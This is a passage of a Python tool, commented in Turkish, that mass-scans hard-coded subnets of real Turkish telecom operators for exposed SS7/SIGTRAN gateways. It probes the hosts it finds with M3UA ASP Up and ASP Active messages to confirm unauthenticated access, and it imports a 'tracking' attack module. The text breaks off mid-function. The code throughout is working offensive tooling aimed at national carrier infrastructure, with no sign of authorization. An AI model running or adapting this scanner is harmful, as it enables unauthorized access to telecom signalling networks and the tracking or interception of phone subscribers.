#!/usr/bin/env python
"""
Türkiye SS7 Altyapı Tarayıcı
Türk ISP subnet'lerini SIGTRAN gateway'ler için tarar.
SCTP protokol doğrulaması ve zafiyet testi içerir.
"""
import os
import time
import sys
import socket
import struct
import random
import json
import concurrent.futures
import ipaddress
import importlib
import importlib.util
from collections import defaultdict

_sri_spec = importlib.util.find_spec("ss7.attacks.tracking")
sri_scapy = None
if _sri_spec:
    sri_module = importlib.import_module("ss7.attacks.tracking")
    sri_scapy = getattr(sri_module, "sri_scapy", None)

# --- TÜRK TELEKOM OPERATÖR SUBNET'LERİ ---
# Kaynak: BGP/RIPE verileri (AS9121, AS16135, AS34984, AS15924, AS12735)
# SS7/SIGTRAN altyapisi genelde core network bloklarinda bulunur
TR_SUBNETS = {
    # =============================================
    # TÜRK TELEKOM (AS9121) - ~7.2M IP
    # En büyük operatör, TTNet altyapısı
    # =============================================
    "Turk Telekom Core": [
        "88.255.0.0/16",       # TT Core network (SS7 bulundu!)
        "212.156.0.0/16",      # TT Core network (SS7 bulundu!)
        "212.175.0.0/16",      # TT backbone
        "62.248.0.0/17",       # TT eski backbone
        "81.212.0.0/16",       # TT altyapi
        "81.213.0.0/16",       # TT altyapi
        "81.214.0.0/16",       # TT transit
        "81.215.0.0/16",       # TT transit
    ],
    "Turk Telekom ADSL": [
        "85.96.0.0/16",        # TTNet ADSL
        "85.97.0.0/16",
        "85.98.0.0/16",
        "85.99.0.0/16",
        "85.100.0.0/16",
        "85.101.0.0/16",
        "85.102.0.0/16",
        "85.103.0.0/16",
        "85.104.0.0/16",
        "85.105.0.0/16",
        "85.106.0.0/16",
        "85.107.0.0/16",
    ],
    "Turk Telekom DSL-2": [
        "78.160.0.0/16",       # TTNet DSL
        "78.161.0.0/16",
        "78.162.0.0/16",
        "78.163.0.0/16",
        "78.164.0.0/16",
        "78.165.0.0/16",
        "78.166.0.0/16",
        "78.167.0.0/16",
        "78.168.0.0/16",
        "78.169.0.0/16",
        "78.170.0.0/16",
        "78.171.0.0/16",
        "78.172.0.0/16",
        "78.173.0.0/16",
        "78.174.0.0/16",
        "78.175.0.0/16",
    ],
    "Turk Telekom IP-2": [
        "88.224.0.0/16",       # TT genişbant
        "88.225.0.0/16",
        "88.226.0.0/16",
        "88.227.0.0/16",
        "88.228.0.0/16",
        "88.229.0.0/16",
        "88.230.0.0/16",
        "88.231.0.0/16",
        "88.232.0.0/16",
        "88.233.0.0/16",
        "88.234.0.0/16",
        "88.235.0.0/16",
        "88.236.0.0/16",
        "88.237.0.0/16",
        "88.238.0.0/16",
        "88.239.0.0/16",
        "88.240.0.0/16",
        "88.241.0.0/16",
        "88.242.0.0/16",
        "88.243.0.0/16",
        "88.244.0.0/16",
        "88.245.0.0/16",
        "88.246.0.0/16",
        "88.247.0.0/16",
        "88.248.0.0/16",
        "88.249.0.0/16",
        "88.250.0.0/16",
        "88.251.0.0/16",
        "88.252.0.0/16",
        "88.253.0.0/16",
        "88.254.0.0/16",
    ],
    # =============================================
    # TURKCELL MOBIL (AS16135) - ~1.7M IP
    # Mobil operatör, 4G/5G core
    # =============================================
    "Turkcell Mobil": [
        "5.24.0.0/16",         # Turkcell mobil
        "5.25.0.0/16",         # Turkcell mobil
        "5.26.0.0/16",         # Turkcell mobil
        "5.27.0.0/16",         # Turkcell mobil
        "31.140.0.0/16",       # Turkcell
        "178.240.0.0/16",      # Turkcell
        "178.241.0.0/16",
        "178.242.0.0/16",
        "178.243.0.0/16",
        "178.244.0.0/16",
        "178.245.0.0/16",
        "178.246.0.0/16",
        "178.247.0.0/16",
        "188.56.0.0/16",       # Turkcell
        "188.57.0.0/16",
        "188.58.0.0/16",
        "188.59.0.0/16",
        "213.74.0.0/16",       # Turkcell eski
        "195.175.0.0/16",      # Turkcell core
    ],
    # =============================================
    # TURKCELL SUPERONLINE (AS34984) - ~3.1M IP
    # Fiber altyapı, Turkcell'in sabit hat kolu
    # =============================================
    "Superonline Core": [
        "176.240.0.0/16",      # Superonline core
        "176.241.0.0/16",
        "176.232.0.0/16",      # Superonline fiber
        "176.233.0.0/16",
        "176.234.0.0/16",
        "176.235.0.0/16",
        "178.233.0.0/16",      # Superonline
        "82.222.0.0/16",       # Superonline eski
        "91.93.0.0/16",        # Superonline
    ],
    "Superonline DSL": [
        "95.0.0.0/16",
        "95.1.0.0/16",
        "95.2.0.0/16",
        "95.3.0.0/16",
        "95.4.0.0/16",
        "95.5.0.0/16",
        "95.6.0.0/16",
        "95.7.0.0/16",
        "95.8.0.0/16",
        "95.9.0.0/16",
        "95.10.0.0/16",
        "95.11.0.0/16",
        "95.12.0.0/16",
        "95.13.0.0/16",
        "95.14.0.0/16",
        "95.15.0.0/16",
    ],
    # =============================================
    # VODAFONE TÜRKİYE (AS15924) - ~1.7M IP
    # Eski Telsim, şimdi Vodafone
    # =============================================
    "Vodafone TR": [
        "31.145.0.0/16",      # Vodafone core
        "31.146.0.0/16",
        "31.147.0.0/16",
        "31.148.0.0/16",
        "46.1.0.0/16",        # Vodafone
        "46.2.0.0/16",
        "46.3.0.0/16",
        "46.4.0.0/16",
        "176.88.0.0/16",      # Vodafone mobil
        "176.89.0.0/16",
        "176.90.0.0/16",
        "176.91.0.0/16",
        "37.130.0.0/16",      # Vodafone
        "94.54.0.0/16",       # Vodafone
        "94.55.0.0/16",
    ],
    # =============================================
    # TURKNET (AS12735) - ISP
    # =============================================
    "TurkNet": [
        "31.223.0.0/16",      # TurkNet DSL
        "185.1.0.0/16",       # TurkNet
        "185.2.0.0/16",
        "5.44.80.0/20",       # TurkNet core
    ],
    # =============================================
    # DİĞER OPERATÖRLER
    # =============================================
    "Millenicom": [
        "185.87.0.0/16",      # Millenicom
    ],
    "TTMobil (Avea)": [
        "217.168.0.0/16",     # Eski Avea (şimdi TT Mobil)
        "195.214.0.0/16",     # Avea core
    ],
}

SIGTRAN_PORTS = {
    2905: "M3UA (SS7 over IP)",
    2904: "M2UA",
    2906: "M2PA",
    14001: "SUA (SCCP over IP)",
}

TIMEOUT = 1.0
THREADS = 100
OUTPUT_FILE = "turkey_ss7_results.txt"
VERIFIED_FILE = "turkey_verified.txt"
VULN_FILE = "turkey_vulnerabilities.txt"


def banner():
    print("""
    \033[31m
    =============================================
       TÜRKİYE SS7 ALTYAPI TARAYICI
    =============================================
    \033[0m
    Türk telekom IP aralıklarını SIGTRAN
    gateway'ler için tarar ve test eder.
    """)


def get_input(prompt, default=None):
    if default is not None:
        data = input(f"{prompt} [{default}]: ").strip()
        return data if data else str(default)
    return input(f"{prompt}: ").strip()


def _prompt_yes_no(prompt, default="e"):
    return get_input(prompt, default).lower() in ("e", "evet", "y", "yes")


def _prompt_int(prompt, default, min_value=None, max_value=None):
    while True:
        raw_value = get_input(prompt, default)
        try:
            value = int(raw_value)
        except ValueError:
            print("[-] Lutfen sayisal bir deger girin.")
            continue
        if min_value is not None and value < min_value:
            print(f"[-] Deger en az {min_value} olmalidir.")
            continue
        if max_value is not None and value > max_value:
            print(f"[-] Deger en fazla {max_value} olmalidir.")
            continue
        return value


def _prompt_ip(prompt, default=None):
    while True:
        raw_value = get_input(prompt, default).strip()
        try:
            ipaddress.ip_address(raw_value)
            return raw_value
        except ValueError:
            print("[-] Gecersiz IP adresi.")


def _prompt_msisdn(prompt, default):
    while True:
        raw_value = get_input(prompt, default).strip()
        msisdn = raw_value.replace(" ", "").replace("-", "").replace("+", "")
        if msisdn.startswith("0"):
            msisdn = "90" + msisdn[1:]
        elif not msisdn.startswith("90"):
            msisdn = "90" + msisdn
        if msisdn.isdigit() and len(msisdn) >= 10:
            return msisdn
        print("[-] MSISDN sayisal olmali ve en az 10 hane olmali.")


def verify_sctp_port(ip, port, timeout=1.0):
    """Port kontrolü + hızlı false positive eleme."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((str(ip), port))
        if result == 0:
            # TCP açık - hızlı M3UA probe ile false positive ele
            try:
                m3ua_aspup = b'\x01\x00\x03\x01\x00\x00\x00\x08'
                s.send(m3ua_aspup)
                s.settimeout(min(timeout, 1.5))
                resp = s.recv(256)
                if resp:
                    # HTTP/web servisi kontrolu
                    if resp[:4] in (b'HTTP', b'<!DO', b'<htm', b'<HTM'):
                        return False, False, "FALSE_POSITIVE: HTTP"
                    if b'HTTP/' in resp[:30] or b'html' in resp[:50].lower():
                        return False, False, "FALSE_POSITIVE: Web"
                    # ASCII text = baska servis
                    if len(resp) >= 8 and all(32 <= b < 127 for b in resp[:8]):
                        return False, False, "FALSE_POSITIVE: ASCII"
                    # M3UA yanit veya reset = gercek SIGTRAN
                    if resp[0] == 0x01 and resp[2] in (0, 1, 2, 3, 4, 9):
                        return True, True, f"M3UA yanit (class={resp[2]})"
                    return True, False, f"TCP acik, bilinmeyen yanit"
                else:
                    return True, False, f"TCP port {port} acik"
            except socket.timeout:
                return True, False, f"TCP acik, M3UA timeout"
            except ConnectionResetError:
                return True, False, f"TCP acik, M3UA reset (firewall)"
            except Exception:
                return True, False, f"TCP port {port} acik"
    except (socket.timeout, OSError):
        pass
    finally:
        if s:
            try: s.close()
            except Exception: pass
    return False, False, None


def check_gateway(ip, ports=None):
    """Gateway kontrolü - false positive eleme dahil."""
    if ports is None:
        ports = [2905]
    findings = []
    for port in ports:
        is_open, is_verified, details = verify_sctp_port(str(ip), port, TIMEOUT)
        if is_open and not (details and 'FALSE_POSITIVE' in str(details)):
            port_name = SIGTRAN_PORTS.get(port, "Bilinmiyor")
            findings.append({
                'ip': str(ip), 'port': port, 'protocol': port_name,
                'verified': is_verified, 'details': details,
            })
    return findings if findings else None


def scan_tr_gateways(selected_isps=None, scan_ports=None, ips_per_subnet=0):
    """Türk subnet'lerini tara."""
    if scan_ports is None:
        scan_ports = [2905]

    print(f"\n\033[34m[*] Turk Telekom subnet'leri taraniyor...\033[0m")
    print(f"[*] Portlar: {', '.join(str(p) + ' (' + SIGTRAN_PORTS.get(p, '?') + ')' for p in scan_ports)}")
    print(f"[*] Timeout: {TIMEOUT}s | Thread: {THREADS}")
    print(f"[*] Sonuclar: {OUTPUT_FILE}")
    print()

    if selected_isps is None:
        subnets_to_scan = []
        for isp, nets in TR_SUBNETS.items():
            for net in nets:
                subnets_to_scan.append((isp, net))
    else:
        subnets_to_scan = []
        for isp in selected_isps:
            if isp in TR_SUBNETS:
                for net in TR_SUBNETS[isp]:
                    subnets_to_scan.append((isp, net))

    with open(OUTPUT_FILE, "w") as f:
        f.write("=" * 60 + "\n")
        f.write(" Turkiye SS7 Tarama Sonuclari\n")
        f.write(f" Tarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f" Portlar: {scan_ports}\n")
        f.write("=" * 60 + "\n\n")

    total_found = 0
    all_findings = []

    for isp_name, subnet in subnets_to_scan:
        print(f"\033[36m[*] {isp_name}: {subnet}\033[0m")
        try:
            net = ipaddress.ip_network(subnet, strict=False)
            hosts = list(net.hosts())
            target_ips = hosts[:ips_per_subnet] if ips_per_subnet > 0 else hosts
            total_ips = len(target_ips)
            print(f"    {total_ips} IP taraniyor...")

            with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
                futures = {ex.submit(check_gateway, ip, scan_ports): ip for ip in target_ips}
                count = 0
                subnet_found = 0
                for future in concurrent.futures.as_completed(futures):
                    count += 1
                    if count % 200 == 0 or count == total_ips:
                        pct = (count / total_ips) * 100
                        sys.stdout.write(f"\r    Ilerleme: {count}/{total_ips} ({pct:.1f}%) | Bulunan: {subnet_found}")
                        sys.stdout.flush()
                    try:
                        result = future.result(timeout=TIMEOUT + 2)
                    except (TimeoutError, Exception):
                        continue
                    if result:
                        for finding in result:
                            subnet_found += 1
                            total_found += 1
                            all_findings.append(finding)
                            ip = finding['ip']
                            port = finding['port']
                            proto = finding['protocol']
                            print(f"\n    \033[33m[+] ADAY: {ip}:{port} ({proto})\033[0m")
                            with open(OUTPUT_FILE, "a") as f:
                                f.write(f"[ADAY] {ip}:{port} ({proto}) - {isp_name}\n")

            print(f"\n    Subnet tamamlandi: {subnet_found} bulundu\n")
        except KeyboardInterrupt:
            print("\n\033[33m[!] Tarama kullanici tarafindan durduruldu.\033[0m")
            break
        except Exception as e:
            print(f"\n    \033[31m[-] Hata: {e}\033[0m")

    print("\n" + "=" * 60)
    print(f" TARAMA TAMAMLANDI - Toplam: {total_found} aday")
    print(f" Sonuclar: {OUTPUT_FILE}")
    print("=" * 60)

    with open(OUTPUT_FILE, "a") as f:
        f.write(f"\n{'=' * 60}\nToplam: {total_found} aday\n")
        f.write(f"Tamamlandi: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    input("\nDevam etmek icin Enter'a basin...")
    return all_findings


# ============================================
# DOĞRULAMA MODÜLÜ
# ============================================

def m3ua_probe(ip, port, timeout=3):
    """M3UA protokol doğrulaması - ASP Up gönder, yanıt kontrol et."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        start = time.time()
        result = sock.connect_ex((ip, port))
        elapsed = time.time() - start

        if result != 0:
            return False, "kapalı", elapsed

        # M3UA ASP Up mesajı gönder
        m3ua_aspup = bytes([
            0x01, 0x00,  # Version 1
            0x03, 0x01,  # ASP Up (Class=3, Type=1)
            0x00, 0x00, 0x00, 0x08  # Length: 8
        ])

        try:
            sock.send(m3ua_aspup)
            response = sock.recv(1024)

            if response and len(response) >= 8:
                # HTTP/HTTPS false positive kontrolu
                if response[:4] in (b'HTTP', b'<!DO', b'<htm', b'<HTM', b'GET ', b'POST'):
                    return False, "FALSE_POSITIVE: HTTP servisi", elapsed
                if b'HTTP/' in response[:20] or b'html' in response[:50].lower():
                    return False, "FALSE_POSITIVE: Web servisi", elapsed
                
                if response[0] == 0x01:  # M3UA version
                    msg_class = response[2]
                    msg_type = response[3]
                    msg_len = struct.unpack('>I', response[4:8])[0]
                    if msg_len < 8 or msg_len > 65535:
                        return False, f"FALSE_POSITIVE: Gecersiz M3UA uzunluk={msg_len}", elapsed
                    # Valid M3UA classes: 0(MGMT), 1(Transfer), 2(SSNM), 3(ASPSM), 4(ASPTM), 9(RKM)
                    if msg_class in (0, 1, 2, 3, 4, 9):
                        return True, f"M3UA yanit! class={msg_class} type={msg_type}", elapsed
                    else:
                        return False, f"FALSE_POSITIVE: M3UA version ama gecersiz class={msg_class}", elapsed
                else:
                    hex_preview = ' '.join(f'{b:02x}' for b in response[:16])
                    # ASCII text = muhtemelen HTTP veya baska servis
                    if all(32 <= b < 127 for b in response[:8]):
                        return False, f"FALSE_POSITIVE: ASCII text yanit", elapsed
                    return False, f"FALSE_POSITIVE: M3UA disi binary yanit ({hex_preview})", elapsed
            elif response:
                hex_preview = ' '.join(f'{b:02x}' for b in response[:16])
                if all(32 <= b < 127 for b in response[:min(8, len(response))]):
                    return False, f"FALSE_POSITIVE: ASCII text", elapsed
                return False, f"FALSE_POSITIVE: M3UA disi kisa yanit ({hex_preview})", elapsed
            else:
                return False, f"TCP acik, M3UA yanit yok ({elapsed:.2f}s)", elapsed
        except socket.timeout:
            return False, "TCP acik, M3UA yanit yok (timeout)", elapsed
        except (ConnectionResetError, BrokenPipeError):
            return False, "TCP acik, baglanti reddedildi (M3UA degil?)", elapsed
    except socket.timeout:
        return False, "timeout", timeout
    except ConnectionRefusedError:
        return False, "reddedildi", 0
    except OSError as e:
        return False, str(e), 0
    finally:
        if sock:
            try: sock.close()
            except Exception: pass


def verify_results():
    """Tarama sonuçlarını M3UA probu ile doğrula."""
    print("\n" + "=" * 60)
    print(" SONUC DOGRULAMA")
    print(" M3UA protokol probu ile gercek gateway'leri ayikla")
    print("=" * 60)

    if not os.path.exists(OUTPUT_FILE):
        print("\n\033[31m[-] Tarama sonucu bulunamadi. Once tarama yapin.\033[0m")
        input("\nDevam etmek icin Enter'a basin...")
        return

    # Sonuçları oku ve IP'ye göre grupla
    ip_ports = defaultdict(list)
    with open(OUTPUT_FILE, 'r') as f:
        for line in f:
            if not (line.startswith('[ADAY]') or line.startswith('[CANDIDATE]')):
                continue
            parts = line.split()
            if len(parts) < 2:
                continue
            target = parts[1]
            if ':' not in target:
                continue
            ip, port = target.rsplit(':', 1)
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                continue
            try:
                port = int(port)
            except ValueError:
                continue
            if not (1 <= port <= 65535):
                continue
            proto = line.split('(', 1)[1].split(')')[0] if '(' in line else '?'
            ip_ports[ip].append({'port': port, 'proto': proto})

    total_ips = len(ip_ports)
    total_entries = sum(len(v) for v in ip_ports.values())

    if total_ips == 0:
        print("\n\033[31m[-] Dogrulanacak aday bulunamadi.\033[0m")
        input("\nDevam etmek icin Enter'a basin...")
        return

    # Öncelik sırala: çok portlu > M3UA > diğer
    def sort_key(item):
        ip, ports = item
        return (-len(ports), -int(any(p['port'] == 2905 for p in ports)))

    sorted_ips = sorted(ip_ports.items(), key=sort_key)
    multi_port = [(ip, p) for ip, p in sorted_ips if len(p) > 1]
    m3ua_only = [(ip, p) for ip, p in sorted_ips if len(p) == 1 and p[0]['port'] == 2905]
    other = [(ip, p) for ip, p in sorted_ips if len(p) == 1 and p[0]['port'] != 2905]

    print(f"\n[*] Toplam: {total_entries} kayit, {total_ips} benzersiz IP")
    print(f"[*] Oncelik:")
    print(f"    Coklu port:    {len(multi_port)} (en guclu)")
    print(f"    M3UA (2905):   {len(m3ua_only)} (guclu)")
    print(f"    Diger portlar: {len(other)} (orta)")

    # Test listesi - tüm IP'leri test et
    test_list = multi_port + m3ua_only + other
    total_to_test = len(test_list)

    print(f"\n[*] {total_to_test} IP test ediliyor (dogrulama + aninda zafiyet testi)...")
    print("[*] Acik bulunan portlara aninda M3UA/ASP testi uygulanacak")
    print("[*] Durdurmak icin Ctrl+C\n")

    with open(VERIFIED_FILE, 'w', encoding='utf-8') as vf:
        vf.write("=" * 60 + "\n")
        vf.write(" Turkiye SS7 - Dogrulanmis Sonuclar\n")
        vf.write(f" Tarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        vf.write("=" * 60 + "\n\n")

    verified = []
    tcp_open = []
    closed_count = 0
    tested = 0
    vuln_findings = []

    try:
        for ip, ports in test_list:
            tested += 1
            port_str = ','.join(str(p['port']) for p in ports)
            sys.stdout.write(f"\r[{tested}/{total_to_test}] {ip} portlar:[{port_str}]...          ")
            sys.stdout.flush()

            ip_results = []
            has_m3ua = False

            for p_info in ports:
                port = p_info['port']
                tcp_open_state, _, tcp_details = verify_sctp_port(ip, port, TIMEOUT)
                is_m3ua, m3ua_details, elapsed = m3ua_probe(ip, port)
                is_open = tcp_open_state or is_m3ua
                details = m3ua_details if is_m3ua else (tcp_details or m3ua_details)

                ip_results.append({
                    'port': port, 'proto': p_info['proto'],
                    'open': is_open, 'details': details, 'elapsed': elapsed,
                })
                if is_m3ua and 'M3UA yanit' in m3ua_details:
                    has_m3ua = True

                # ANINDA ZAFIYET TESTI: M3UA dogrulanirsa ASP Active dene
                if is_m3ua:
                    _quick_vuln_test(ip, port, vuln_findings)

            open_ports = [r for r in ip_results if r['open']]

            if has_m3ua:
                verified.append((ip, ip_results))
                label = "\033[32m[DOĞRULANDI]\033[0m"
            elif open_ports:
                tcp_open.append((ip, ip_results))
                label = "\033[33m[TCP AÇIK]\033[0m" if len(open_ports) >= 2 else "\033[36m[PORT AÇIK]\033[0m"
            else:
                closed_count += 1
                label = "\033[31m[KAPALI]\033[0m"

            port_detail = ', '.join(f"{r['port']}({'+' if r['open'] else '-'})" for r in ip_results)
            print(f"\r[{tested}/{total_to_test}] {label} {ip} [{port_detail}]")

            for r in ip_results:
                if r['open'] and r['details']:
                    print(f"           -> {r['port']}: {r['details']}")

            if open_ports:
                with open(VERIFIED_FILE, 'a', encoding='utf-8') as vf:
                    for r in ip_results:
                        if r['open']:
                            tag = "VERIFIED" if has_m3ua else "TCP-OPEN"
                            vf.write(f"[{tag}] {ip}:{r['port']} ({r['proto']}) | {r['details']}\n")

    except KeyboardInterrupt:
        print("\n\n[!] Kullanici tarafindan durduruldu.")

    # Ozet
    print("\n" + "=" * 60)
    print(" DOGRULAMA SONUCLARI")
    print("=" * 60)
    print(f"  Test edilen:              {tested}")
    print(f"  \033[32mM3UA Dogrulanmis:          {len(verified)}\033[0m")
    print(f"  \033[33mTCP Acik:                  {len(tcp_open)}\033[0m")
    print(f"  \033[31mKapali/Erisilemez:         {closed_count}\033[0m")
    print(f"\n  Dosya: {VERIFIED_FILE}")
    print("=" * 60)

    if verified:
        print("\n  \033[32mEN GUCLU ADAYLAR (M3UA Yaniti Alindi):\033[0m")
        for ip, results in verified[:10]:
            ports = ', '.join(str(r['port']) for r in results if r['open'])
            print(f"    -> {ip}  portlar: {ports}")

    multi = [(ip, res) for ip, res in tcp_open if len([r for r in res if r['open']]) >= 2]
    if multi:
        print(f"\n  \033[33mCOKLU PORT ACIK:\033[0m")
        for ip, results in multi[:10]:
            ports = ', '.join(str(r['port']) for r in results if r['open'])
            print(f"    -> {ip}  portlar: {ports}")

    # Anlık zafiyet testi sonuçları
    if vuln_findings:
        print(f"\n  \033[31mZAFIYET BULGULARI ({len(vuln_findings)} adet):\033[0m")
        for vf_item in vuln_findings:
            color = "\033[31m" if vf_item['risk'] == 'KRITIK' else "\033[33m"
            print(f"    {color}[{vf_item['risk']}]\033[0m {vf_item['ip']}:{vf_item['port']} - {vf_item['test']}: {vf_item['detay']}")

        # Zafiyet raporunu kaydet
        with open(VULN_FILE, 'w', encoding='utf-8') as vf_out:
            vf_out.write("=" * 60 + "\n")
            vf_out.write(" Turkiye SS7 Zafiyet Raporu\n")
            vf_out.write(f" Tarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            vf_out.write("=" * 60 + "\n\n")
            for vf_item in vuln_findings:
                vf_out.write(f"[{vf_item['risk']}] {vf_item['ip']}:{vf_item['port']} - {vf_item['test']}: {vf_item['detay']}\n")
        print(f"\n  Zafiyet raporu: {VULN_FILE}")
    else:
        print(f"\n  Anlik zafiyet testi: Acik portlarda zafiyet bulunamadi.")

    input("\nDevam etmek icin Enter'a basin...")
    return verified, tcp_open


# ============================================
# HIZLI ZAFİYET TESTİ (doğrulama sırasında)
# ============================================

def _quick_vuln_test(ip, port, findings_list):
    """Port açıkken anında M3UA ASP Up + ASP Active dene."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        # ASP Up
        aspup = bytes([0x01, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x08])
        sock.send(aspup)
        resp1 = sock.recv(1024)

        if resp1 and len(resp1) >= 8 and resp1[0] == 0x01 and resp1[2] == 3 and resp1[3] == 4:
            asp_class = resp1[2]
            asp_type = resp1[3]
            print(f"           \033[33m[!] M3UA ASP Up yaniti: class={asp_class} type={asp_type}\033[0m")

            findings_list.append({
                'ip': ip, 'port': port, 'test': 'M3UA ASP Up',
                'risk': 'YUKSEK', 'detay': f'ASP Up Ack (class={asp_class}, type={asp_type})',
            })

            # ASP Active dene
            asp_active = bytes([0x01, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x08])
            sock.send(asp_active)
            resp2 = sock.recv(1024)

            if resp2 and len(resp2) >= 8 and resp2[0] == 0x01 and resp2[2] == 4 and resp2[3] == 3:
                print(f"           \033[31m[!!!] KRITIK: ASP Active KABUL! Kimlik dogrulama YOK!\033[0m")
                findings_list.append({
                    'ip': ip, 'port': port, 'test': 'M3UA ASP Active',
                    'risk': 'KRITIK', 'detay': 'ASP Active kabul edildi - kimlik dogrulama yok!',
                })
    except Exception:
        pass
    finally:
        if sock:
            try: sock.close()
            except Exception: pass


# ============================================
# TAM ZAFİYET TESTİ MODÜLÜ
# ============================================

def vulnerability_test():
    """Dogrulanmis hedeflere zafiyet testi uygula."""
    print("\n" + "=" * 60)
    print(" SS7/SIGTRAN ZAFIYET TESTI")
    print(" Dogrulanmis gateway'lerde guvenlik acigi kontrolu")
    print("=" * 60)

    # Önce doğrulanmış, yoksa tarama sonuçlarından oku
    targets = []

    # 1. Dogrulanmis sonuclar
    if os.path.exists(VERIFIED_FILE):
        try:
            vf_encoding = 'utf-8'
            try:
                with open(VERIFIED_FILE, 'r', encoding='utf-8') as f:
                    f.read(100)
            except UnicodeDecodeError:
                vf_encoding = 'latin-1'
        except Exception:
            vf_encoding = 'latin-1'

        with open(VERIFIED_FILE, 'r', encoding=vf_encoding, errors='replace') as f:
            for line in f:
                # Hem ASCII hem garbled Turkce tag'leri tanı
                if any(tag in line[:20] for tag in ['[VERIFIED]', '[TCP-OPEN]', '[DO', '[TCP_', '[TCP ']):
                    parts = line.split()
                    if len(parts) >= 2:
                        target = parts[1]
                        if ':' in target:
                            ip, port = target.rsplit(':', 1)
                            try:
                                ipaddress.ip_address(ip)
                                port_val = int(port)
                                if 1 <= port_val <= 65535:
                                    targets.append((ip, port_val))
                            except ValueError:
                                pass

    # 2. Yoksa dogrudan tarama sonuclarindan al
    if not targets and os.path.exists(OUTPUT_FILE):
        print("\n\033[33m[!] Dogrulanmis sonuc az, tarama dosyasindan okunuyor...\033[0m")
        with open(OUTPUT_FILE, 'r', encoding='utf-8', errors='replace') as f:
            for line in f:
                if line.startswith('[ADAY]') or line.startswith('[CANDIDATE]'):
                    parts = line.split()
                    if len(parts) >= 2:
                        target = parts[1]
                        if ':' in target:
                            ip, port = target.rsplit(':', 1)
                            try:
                                ipaddress.ip_address(ip)
                                port_val = int(port)
                                if 1 <= port_val <= 65535:
                                    targets.append((ip, port_val))
                            except ValueError:
                                pass

    # Benzersiz IP'ler (sıralı)
    unique_ips = list(dict.fromkeys(ip for ip, _ in targets))

    if not unique_ips:
        print("\n\033[31m[-] Hedef bulunamadi. Once tarama yapin.\033[0m")
        input("\nDevam etmek icin Enter'a basin...")
        return

    # Çok fazlaysa limitle
    if len(unique_ips) > 50:
        print(f"\n[*] {len(unique_ips)} hedef var, ilk 50 test edilecek.")
        print("[*] Tamamini test etmek uzun surebilir.")
        if not _prompt_yes_no("[?] Tumunu test et? (e/h)", "h"):
            unique_ips = unique_ips[:50]

    print(f"\n[*] {len(unique_ips)} benzersiz hedef bulundu")
    print(f"[*] Her hedef icin asagidaki testler yapilacak:\n")

    tests = [
        ("SCTP INIT Handshake", "SCTP 4-way handshake denemesi"),
        ("M3UA ASP Up", "M3UA katman baglantisi"),
        ("M3UA ASP Active", "M3UA aktif duruma gecme"),
        ("SCCP Baglanti", "SCCP UDT mesaj denemesi"),
        ("Banner Toplama", "Servis/versiyon bilgisi"),
        ("Port Capraz Kontrol", "Tum SIGTRAN portlari"),
    ]

    for i, (name, desc) in enumerate(tests):
        print(f"  {i+1}) {name}: {desc}")

    print()
    if not _prompt_yes_no("[?] Testlere baslansin mi? (e/h)", "e"):
        return

    # Zafiyet raporu oluştur
    report = {
        'tarih': time.strftime('%Y-%m-%d %H:%M:%S'),
        'hedefler': [],
    }

    with open(VULN_FILE, 'w', encoding='utf-8') as vf:
        vf.write("=" * 70 + "\n")
        vf.write(" TURKIYE SS7 ZAFIYET RAPORU\n")
        vf.write(f" Tarih: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        vf.write("=" * 70 + "\n\n")

    for idx, ip in enumerate(unique_ips):
      try:
        print(f"\n{'-' * 60}")
        print(f" [{idx+1}/{len(unique_ips)}] Hedef: {ip}")
        print(f"{'-' * 60}")

        target_report = {
            'ip': ip,
            'zafiyetler': [],
            'acik_portlar': [],
            'risk_seviyesi': 'DUSUK',
        }

        # Test 1: Tum SIGTRAN portlarini kontrol et
        print("\n  [1/6] Port Taramasi...")
        open_ports = []
        for port, name in SIGTRAN_PORTS.items():
            is_open, _, _ = verify_sctp_port(ip, port, 2)
            status = "\033[32mACIK\033[0m" if is_open else "\033[31mKAPALI\033[0m"
            print(f"        {port} ({name}): {status}")
            if is_open:
                open_ports.append(port)
                target_report['acik_portlar'].append(port)

        if not open_ports:
            print("  \033[31m  -> Acik port bulunamadi, atlaniyor.\033[0m")
            continue

        # Test 2: M3UA ASP Up
        print("\n  [2/6] M3UA ASP Up Testi...")
        for port in open_ports:
            is_verified, details, _ = m3ua_probe(ip, port, 3)
            if is_verified and 'M3UA yanit' in details:
                print(f"        \033[32m[+] {port}: {details}\033[0m")
                target_report['zafiyetler'].append({
                    'test': 'M3UA ASP Up',
                    'port': port,
                    'sonuc': 'ACIK',
                    'detay': details,
                    'risk': 'YUKSEK',
                })
            elif is_verified:
                print(f"        \033[33m[~] {port}: {details}\033[0m")
            else:
                print(f"        \033[31m[-] {port}: {details}\033[0m")

        # Test 3: M3UA ASP Active denemesi
        print("\n  [3/6] M3UA ASP Active Testi...")
        for port in open_ports:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))

                # ASP Up
                aspup = bytes([0x01, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x08])
                sock.send(aspup)
                resp1 = sock.recv(1024)

                if resp1 and len(resp1) >= 8 and resp1[0] == 0x01 and resp1[2] == 3 and resp1[3] == 4:
                    # ASP Active
                    asp_active = bytes([0x01, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x08])
                    sock.send(asp_active)
                    resp2 = sock.recv(1024)

                    if resp2 and len(resp2) >= 8 and resp2[0] == 0x01 and resp2[2] == 4 and resp2[3] == 3:
                        print(f"        \033[31m[!!!] {port}: ASP Active KABUL EDILDI! KRITIK ZAFIYET!\033[0m")
                        target_report['zafiyetler'].append({
                            'test': 'M3UA ASP Active',
                            'port': port,
                            'sonuc': 'KRITIK',
